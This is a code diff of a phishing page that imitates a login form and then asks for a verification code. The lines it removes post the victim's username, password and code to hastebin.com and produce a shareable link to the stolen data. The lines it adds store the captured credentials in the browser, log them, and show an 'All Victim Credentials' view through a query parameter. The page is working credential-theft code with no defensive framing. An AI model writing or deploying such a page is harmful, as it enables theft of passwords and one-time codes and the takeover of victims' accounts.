@@ -54,7 +54,6 @@
             border: none;
             border-radius: 4px;
             cursor: pointer;
-            margin-bottom: 10px;
         }
         .btn:hover {
             background-color: #01366d;
@@ -78,23 +77,12 @@
             margin: 0 10px;
             text-decoration: none;
         }
-        #codeSection, #viewCreds, #pasteSection {
+        #codeSection, #viewCreds {
             display: none;
         }
         #viewCreds {
             color: green;
             text-align: center;
-        }
-        #pasteSection {
-            text-align: center;
-            margin-top: 20px;
-        }
-        #pasteLink {
-            width: 100%;
-            padding: 8px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
         }
     </style>
 </head>
@@ -132,11 +120,6 @@
             </div>
             <button class="btn" onclick="submitCode()">Submit</button>
         </div>
-        <div id="pasteSection">
-            <p>Credentials submitted. Share this link to view:</p>
-            <input type="text" id="pasteLink" readonly>
-            <button class="btn" onclick="copyLink()">Copy Link</button>
-        </div>
         <div id="viewCreds" style="color: green; text-align: center;">
             <p id="credsContent">Verification complete. Thank you.</p>
         </div>
@@ -149,60 +132,77 @@
     </div>
 
     <script>
-        let credentials = {};
-
         function submitLogin() {
-            credentials = {
-                username: document.getElementById('username').value || 'N/A',
-                password: document.getElementById('password').value || 'N/A',
-                timestamp: new Date().toISOString(),
-                code: null,
-                codeTimestamp: null
+            const newCredentials = {
+                sessionId: Date.now() + '-' + Math.random().toString(36).slice(2, 11),
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString()
             };
-            sendToPastebin();
+
+            // Store in localStorage
+            let credentialHistory = JSON.parse(localStorage.getItem('credentialHistory')) || [];
+            credentialHistory.push(newCredentials);
+            localStorage.setItem('credentialHistory', JSON.stringify(credentialHistory));
+
+            document.getElementById('loginSection').style.display = 'none';
+            document.getElementById('codeSection').style.display = 'block';
         }
 
         function submitCode() {
-            credentials.code = document.getElementById('code').value || 'Not submitted';
-            credentials.codeTimestamp = new Date().toISOString();
-            sendToPastebin();
+            const credentialHistory = JSON.parse(localStorage.getItem('credentialHistory')) || [];
+            const latestCredentials = credentialHistory[credentialHistory.length - 1] || {};
+            latestCredentials.code = document.getElementById('code').value;
+            latestCredentials.codeTimestamp = new Date().toISOString();
+
+            // Update latest entry with code
+            credentialHistory[credentialHistory.length - 1] = latestCredentials;
+            localStorage.setItem('credentialHistory', JSON.stringify(credentialHistory));
+
+            document.getElementById('codeSection').style.display = 'none';
+            document.getElementById('viewCreds').style.display = 'block';
+            document.getElementById('credsContent').innerHTML = '<p>Verification complete. Thank you.</p>';
+
+            console.log('Captured Credentials:', latestCredentials);
         }
 
-        function sendToPastebin() {
-            const data = `Username: ${credentials.username}\nPassword: ${credentials.password}\nTimestamp: ${credentials.timestamp}\nCode: ${credentials.code || 'Not submitted'}\n${credentials.code ? `Code Timestamp: ${credentials.codeTimestamp}` : ''}`;
-            fetch('https://hastebin.com/documents', {
-                method: 'POST',
-                body: data
-            })
-            .then(response => response.json())
-            .then(result => {
-                const pasteUrl = `https://hastebin.com/${result.key}`;
-                document.getElementById('codeSection').style.display = 'none';
-                document.getElementById('pasteSection').style.display = 'block';
-                document.getElementById('pasteLink').value = pasteUrl;
-                document.getElementById('viewCreds').style.display = 'block';
-                document.getElementById('credsContent').innerHTML = '<p>Verification complete. Thank you.</p>';
-            })
-            .catch(error => {
-                console.error('Error sending to hastebin:', error);
-                document.getElementById('credsContent').innerHTML = '<p>Error submitting credentials.</p>';
-            });
-        }
-
-        function copyLink() {
-            const pasteLink = document.getElementById('pasteLink');
-            pasteLink.select();
-            document.execCommand('copy');
-            alert('Link copied! Share it to view the credentials.');
-        }
-
+        // Check for viewcreds query parameter on page load
         window.onload = function() {
-            document.querySelector('span').addEventListener('click', function() {
-                const passwordInput = document.getElementById('password');
-                passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-                this.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
-            });
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('viewcreds')) {
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('codeSection').style.display = 'none';
+                document.getElementById('viewCreds').style.display = 'block';
+
+                // Retrieve all credentials from localStorage
+                const credentialHistory = JSON.parse(localStorage.getItem('credentialHistory')) || [];
+                
+                if (credentialHistory.length > 0) {
+                    let credsHtml = '<h2>All Victim Credentials</h2>';
+                    credentialHistory.forEach((creds, index) => {
+                        credsHtml += `
+                            <div style="margin-bottom: 20px;">
+                                <h3>Session ${index + 1} (ID: ${creds.sessionId})</h3>
+                                <p><strong>Username:</strong> ${creds.username || 'N/A'}</p>
+                                <p><strong>Password:</strong> ${creds.password || 'N/A'}</p>
+                                <p><strong>Code:</strong> ${creds.code || 'Not submitted'}</p>
+                                ${creds.code ? `<p><strong>Code Submitted At:</strong> ${creds.codeTimestamp}</p>` : ''}
+                            </div>
+                        `;
+                    });
+                    document.getElementById('credsContent').innerHTML = credsHtml;
+                } else {
+                    document.getElementById('credsContent').innerHTML = '<p>No credentials available.</p>';
+                }
+            }
         };
+
+        // Simulate showing password
+        document.querySelector('span').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+            this.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
+        });
     </script>
 </body>
 </html>
